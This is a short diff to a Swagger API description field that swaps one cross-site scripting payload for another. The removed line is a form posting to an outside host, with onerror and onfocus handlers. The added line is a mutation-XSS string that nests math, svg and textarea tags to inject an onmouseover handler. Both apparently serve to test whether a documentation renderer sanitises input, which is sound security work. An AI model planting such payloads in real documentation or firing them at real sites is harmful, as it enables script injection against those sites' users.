@@ -2,6 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    123123<h1>123</h1><form action=https://brutelogic.com.br/gym.php method=POST><input type=image src=1 onerror=alert(1)><input autofocus onfocus=alert(1)><input type=submit value=XSS></form>
+    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><p onmouseover="alert('xss');">xss</p>">
+
 
   version: production
